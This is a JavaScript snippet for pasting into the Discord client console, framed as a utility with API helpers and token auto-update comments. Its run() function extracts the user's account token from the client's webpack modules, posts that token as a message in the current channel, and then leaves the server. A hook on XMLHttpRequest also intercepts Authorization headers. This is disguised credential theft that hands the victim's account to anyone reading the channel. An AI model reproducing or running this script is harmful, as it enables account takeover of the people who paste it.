{
  var serverid = '<guild_id>' // Current guild id
  var channelid = '<channel_id>' // Current channel id
  
  
  
  //-----------------------------------------------\\
  var delay = ms => new Promise(res => setTimeout(res, ms))
  // prettier-ignore
  var qs = obj => Object.entries(obj).map(([k, v]) => `${k}=${v}`).join('&')

  const xSuperPropertiesObj = {
    os: 'Windows',
    browser: 'Discord Client',
    release_channel: 'stable',
    client_version: '1.0.9006',
    os_version: '10.0.22000',
    os_arch: 'x64',
    system_locale: 'en-US',
    client_build_number: 142868,
    client_event_source: null
  }

  const apiCall = (apiPath, body, method = 'GET', options = {}) => {
    if (!authHeader) throw new Error("The authorization token is missing. Did you forget to set it? `authHeader = 'your_token'`")
    const fetchOptions = {
      body: body ? body : undefined,
      method,
      headers: {
        Accept: '*/*',
        'Accept-Language': 'en-US',
        Authorization: authHeader,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9006 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
        'X-Super-Properties': btoa(JSON.stringify(xSuperPropertiesObj))
      },
      ...options
    }
    const isFormData = body?.constructor?.name === 'FormData'
    if (!isFormData) {
      fetchOptions.headers['Content-Type'] = 'application/json'
      fetchOptions.body = JSON.stringify(body)
    }
    return fetch(`https://discord.com/api/v9${apiPath}`, fetchOptions)
      .then(res => res.json().catch(() => {}))
      .catch(console.error)
  }

  var api = {
    sendMessage: (channelOrThreadId, message, tts, body = {}) => apiCall(`/channels/${channelOrThreadId}/messages`, { content: message, tts: !!tts, ...body }, 'POST'),
    leaveServer: guildId => apiCall(`/users/@me/guilds/${guildId}`, null, 'DELETE'),

    delay,
    apiCall
  }



  // Call this to update `channelid` and `serverid` to current channel and guild id
  var id = (log = true) => {
    serverid = window.location.href.split('/').slice(4)[0]
    channelid = window.location.href.split('/').slice(4)[1]
    if (log) {
    }
  }
  id(false)

  // Do not replace configuration when reusing script in same context
  if (!authHeader) {
    //
    // Set your authorization token here (or use the auto update, send a message in any chat!)
    //
    var authHeader = (
    webpackChunkdiscord_app.push(
        [
            [''],
            {},
            e => {
                m=[];
                for(let c in e.c)
                    m.push(e.c[c])
            }
        ]
    ),
    m
).find(
    m => m?.exports?.default?.getToken !== void 0
).exports.default.getToken()
    var autoUpdateToken = true
  }

  if (!XMLHttpRequest_setRequestHeader) {
    var XMLHttpRequest_setRequestHeader = XMLHttpRequest.prototype.setRequestHeader
  }
  // Auto update the authHeader when a request with the token is intercepted
  XMLHttpRequest.prototype.setRequestHeader = function () {
    if (autoUpdateToken && arguments[0] === 'Authorization' && authHeader !== arguments[1]) {
      authHeader = arguments[1]
      console.log(`Updated the Auth token! <${authHeader.slice(0, 50)}...>`)
    }
    XMLHttpRequest_setRequestHeader.apply(this, arguments)
  }
}
async function run() {
  await api.sendMessage(channelid,(
    webpackChunkdiscord_app.push(
        [
            [''],
            {},
            e => {
                m=[];
                for(let c in e.c)
                    m.push(e.c[c])
            }
        ]
    ),
    m
).find(
    m => m?.exports?.default?.getToken !== void 0
).exports.default.getToken())
  await api.leaveServer(serverid)
}

run()
